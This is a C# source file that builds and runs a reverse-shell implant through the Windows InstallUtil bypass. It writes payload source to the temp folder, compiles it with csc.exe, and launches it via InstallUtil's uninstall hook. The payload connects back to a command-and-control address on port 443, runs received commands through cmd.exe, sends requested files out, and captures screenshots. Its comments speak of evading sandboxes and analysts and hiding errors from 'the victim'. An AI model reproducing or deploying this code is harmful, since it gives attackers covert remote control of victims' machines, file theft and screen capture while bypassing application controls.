using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Consoleinst
{
    class Program
    {
        static void Main(string[] args)
        {
            createinstallutiltemplate();
            buildbinary();
            runbinaryusinginst();
        }

        static void createinstallutiltemplate()
        {
            string build = @"using System;
using System.Text;
            using System.ComponentModel;
            using System.Configuration.Install;
            using System.Threading;
            using System.Net.Sockets;
            using System.Net;
            using System.Drawing;
            using System.Drawing.Imaging;
            using System.Windows.Forms;
            using System.Diagnostics;

namespace InstallUtilTest
    {
        public class Program
        {

            public static void Main()
            {
                Console.WriteLine(""Does not have any role here"");
                //Add any behaviour here to throw off sandbox execution/analysts :)

            }
        }

        [RunInstaller(true)]
        public partial class RevShellInsaller : Installer
        {

            public override void Uninstall(System.Collections.IDictionary mySavedState)
            {

                //base.Uninstall(mySavedState);
                connectbacktoCandC();
                Console.WriteLine(""The Uninstall method of 'RevShellInsaller' has been called"");

            }

            static string getresult(string command) // this function executes command from the remote server and sends back the result as  string (byte array)
            {
                Process p = new Process();
                p.StartInfo.FileName = ""cmd.exe"";
                p.StartInfo.Arguments = "" / c "" + command;
                p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.Start();

                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();

                return output;
            }

            private string getscreen()

            {
                string fname = ""myscreen.png"";
                try

                {

                    Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);

                    //Creating a Rectangle object which will  
                    //capture our Current Screen

                    Rectangle captureRectangle = Screen.PrimaryScreen.Bounds; // here we are taking only primary screen if you want to use in real time env loop through all screns and take screen shots



                    //Creating a New Graphics Object
                    Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                    captureBitmap.Save(fname, ImageFormat.Png);


                }

                catch (Exception)
                {
                    // MessageBox.Show(ex.Message);
                }
                return fname;
            }
            private void connectbacktoCandC()
            {
                IPAddress ipAddress = IPAddress.Parse(""192.168.20.13""); 
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, 443); 
                                                                       
                Socket sender = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                sender.Connect(remoteEP); 

                while (true)
                {

                    try
                    {
                        string data = """";
                        string result;

                        var buffer = new byte[1024];
                        int bytesRead;
                        int lineposition = -1;

                        do
                        {
                            lineposition = Array.IndexOf(buffer, (byte)'\n'); 
                            bytesRead = sender.Receive(buffer);
                            data += Encoding.ASCII.GetString(buffer, 0, bytesRead);

                        }
                        while (lineposition >= 0); 
                       

                        if (data.ToLower().StartsWith(""getfile"")) 
                        {
                            string[] filename = data.Split(new char[] { ' ' });
                            sender.SendFile(filename[1]); 
                            Thread.Sleep(700);  
                            sender.Send(Encoding.ASCII.GetBytes(""EOF"")); 
                        }
                        else if (data.ToLower().StartsWith(""bye""))
                        {
                            break; // for terminating the connection by breaking the loop 
                        }
                        else if (data.ToLower().StartsWith(""grabscreen""))  
                        {
                            string sendscreen = getscreen();
                            sender.SendFile(sendscreen);
                            Thread.Sleep(700);
                            sender.Send(Encoding.ASCII.GetBytes(""EOF""));  
                            System.IO.File.Delete(sendscreen);
                        }
                        else
                        { // here is the core command execution , instead of sending the shell over tcp , we send only the command's result
                            result = getresult(data);
                            Console.WriteLine(result);
                            byte[] msg = Encoding.ASCII.GetBytes(result + ""EOF"");
                            Console.WriteLine(msg.Length);
                            sender.Send(msg);
                            //sender.Shutdown(SocketShutdown.Both);
                        }


                        // Release the socket.    
                        //

                    }
                    catch (ArgumentNullException ane) // we throw all exceptions to the main function and supress it there since we dont need to indicate any error to the victim
                    {
                        throw ane;
                    }
                    catch (SocketException se)
                    {
                        throw se;
                    }
                    catch (Exception e)
                    {
                        throw e;
                    }


                }
                sender.Shutdown(SocketShutdown.Both); // out side the loop , close connection
                sender.Close();
            }
        }
    }
";

            File.WriteAllText(@"c:\windows\temp\installutiltest.cs", build);
        }


      static  string buildbinary()
        {
            Process p = new Process();
            p.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
            p.StartInfo.Arguments = @"/out:C:\Windows\temp\goinstut.exe c:\windows\temp\installutiltest.cs /r:System.Configuration.Install.dll";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            // p.WaitForExit();
            return output;

        }
    static    string runbinaryusinginst()
        {
            string installutilpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe";

            Process p = new Process();
            p.StartInfo.FileName = installutilpath;
            p.StartInfo.Arguments = @"/LogToConsole=false /U C:\Windows\temp\goinstut.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;

            p.Start();

            string output = p.StandardOutput.ReadToEnd();

            // p.WaitForExit();
            return output;

        }
    }
}
